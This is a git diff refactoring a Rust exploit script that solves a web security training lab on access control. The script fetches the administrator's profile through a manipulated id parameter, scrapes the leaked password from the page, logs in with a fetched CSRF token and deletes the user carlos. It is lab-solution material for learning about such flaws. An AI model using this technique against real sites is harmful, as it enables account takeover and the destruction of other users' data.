@@ -1,25 +1,19 @@
-/***************************************************************************
-*
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 5/9/2023
+/******************************************************************************
 *
 * Lab: User ID controlled by request parameter with password disclosure
 *
-* Steps: 1. Fetch administrator page via URL id parameter
-*        2. Extract the password from source code
-*        3. Login as administrator
-*        4. Delete carlos
+* Hack Steps: 
+*      1. Fetch the administrator page via URL id parameter
+*      2. Extract the password from the source code
+*      3. Fetch the login page to get a valid session and the csrf token
+*      4. Login as administrator
+*      5. Delete carlos
 *
-****************************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+*******************************************************************************/
+use lazy_static::lazy_static;
 use regex::Regex;
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
     redirect::Policy,
 };
 use select::{document::Document, predicate::Attr};
@@ -30,107 +24,61 @@ use std::{
 };
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
+// Change this to your lab URL
+const LAB_URL: &str = "https://0a1d002a04d9a3e285af9bf100e30072.web-security-academy.net";
+
+lazy_static! {
+    static ref WEB_CLIENT: Client = build_web_client();
+}
+
 fn main() {
-    // change this to your lab URL
-    let url = "https://0a2f00c9041179a18123e1cc0010004e.web-security-academy.net";
+    print!("⦗1⦘ Fetching the administrator profile page.. ");
+    flush_terminal();
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
-
-    print!("{} ", "1. Fetching administrator profile page..".white());
-    io::stdout().flush();
-
-    // fetch administrator profile vi URL id parameter
-    let admin_profile = client
-        .get(format!("{url}/my-account?id=administrator"))
-        .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to fetch administrator profile".red()
-        ));
+    let admin_profile = fetch("/my-account?id=administrator");
 
     println!("{}", "OK".green());
-    print!("{} ", "2. Extracting password from source code..".white());
-    io::stdout().flush();
+    print!("⦗2⦘ Extracting password from the source code.. ");
+    flush_terminal();
 
-    // extract the password from source code
     let body = admin_profile.text().unwrap();
-    let admin_pass = capture_pattern("name=password value='(.*)'", &body).expect(&format!(
-        "{}",
-        "[!] Failed to extract the admin password".red()
-    ));
+    let admin_password = capture_pattern_from_text("name=password value='(.*)'", &body);
 
-    println!("{} => {}", "OK".green(), admin_pass.yellow());
-    print!(
-        "{} ",
-        "3. Fetching login page to get valid session and csrf token..".white()
-    );
-    io::stdout().flush();
+    println!("{} => {}", "OK".green(), admin_password.yellow());
+    print!("⦗3⦘ Fetching the login page to get a valid session and the csrf token.. ");
+    flush_terminal();
 
-    // fetch the login page to get valid session csrf token
-    let get_login = client
-        .get(format!("{url}/login"))
-        .send()
-        .expect(&format!("{}", "[!] Failed to fetch the login page".red()));
-
-    // extract session cookie
-    let session = extract_session_cookie(get_login.headers())
-        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
-
-    // extract the csrf token
-    let csrf = extract_csrf(get_login).expect(&format!("{}", "[!] Failed to extract the csrf".red()));
+    let login_page = fetch("/login");
+    let session = get_session_cookie(&login_page);
+    let csrf_token = get_csrf_token(login_page);
 
     println!("{}", "OK".green());
-    print!("{} ", "4. Logging in as administrator..".white());
-    io::stdout().flush();
+    print!("⦗4⦘ Logging in as administrator.. ");
+    flush_terminal();
 
-    // login as admin
-    let login = client
-        .post(format!("{url}/login"))
+    let login_as_admin = WEB_CLIENT
+        .post(format!("{LAB_URL}/login"))
         .header("Cookie", format!("session={session}"))
         .form(&HashMap::from([
             ("username", "administrator"),
-            ("password", &admin_pass),
-            ("csrf", &csrf),
+            ("password", &admin_password),
+            ("csrf", &csrf_token),
         ]))
         .send()
-        .expect(&format!("{}", "[!] Failed to login as admin".red()));
-
-    // extract session cookie
-    let new_session = extract_session_cookie(login.headers()).expect(&format!(
-        "{}",
-        "[!] Failed to extract new session cookie".red()
-    ));
+        .expect(&format!("{}", "⦗!⦘ Failed to login as admin".red()));
 
     println!("{}", "OK".green());
-    print!("{} ", "5. Deleting carlos..".white());
-    io::stdout().flush();
+    print!("⦗5⦘ Deleting carlos.. ");
+    flush_terminal();
 
-    // delete carlos
-    client
-        .get(format!("{url}/admin/delete?username=carlos"))
-        .header("Cookie", format!("session={new_session}"))
-        .send()
-        .expect(&format!("{}", "[!] Failed to delete carlos".red()));
+    let admin_session = get_session_cookie(&login_as_admin);
+    fetch_with_session("/admin/delete?username=carlos", &admin_session);
 
     println!("{}", "OK".green());
-    println!(
-        "{} {}",
-        "🗹 The lab should be marked now as"
-            .white()
-            .bold(),
-        "solved".green().bold()
-    )
+    println!("🗹 The lab should be marked now as {}", "solved".green())
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
         .connect_timeout(Duration::from_secs(5))
@@ -138,40 +86,46 @@ fn build_client() -> Client {
         .unwrap()
 }
 
-/********************************************
-* Function to capture a pattern form a text
-*********************************************/
-fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
-    let pattern = Regex::new(pattern).unwrap();
-    if let Some(text) = pattern.captures(text) {
-        Some(text.get(1).unwrap().as_str().to_string())
-    } else {
-        None
-    }
+fn fetch(path: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
+        .send()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
 }
 
-/**********************************************************
-* Function to extract session field from the cookie header
-***********************************************************/
-fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
-    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
-    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
-        Some(session.as_str().to_string())
-    } else {
-        None
-    }
+fn fetch_with_session(path: &str, session: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
+        .header("Cookie", format!("session={session}"))
+        .send()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
 }
 
-/*************************************************
-* Function to extract csrf from the response body
-**************************************************/
-fn extract_csrf(res: Response) -> Option<String> {
-    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
+fn get_csrf_token(response: Response) -> String {
+    let document = Document::from(response.text().unwrap().as_str());
+    document
         .find(Attr("name", "csrf"))
         .find_map(|f| f.attr("value"))
-    {
-        Some(csrf.to_string())
-    } else {
-        None
-    }
+        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
+        .to_string()
+}
+
+fn get_session_cookie(response: &Response) -> String {
+    let headers = response.headers();
+    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
+    capture_pattern_from_text("session=(.*); Secure", cookie_header)
+}
+
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
+}
+
+#[inline(always)]
+fn flush_terminal() {
+    io::stdout().flush().unwrap();
 }
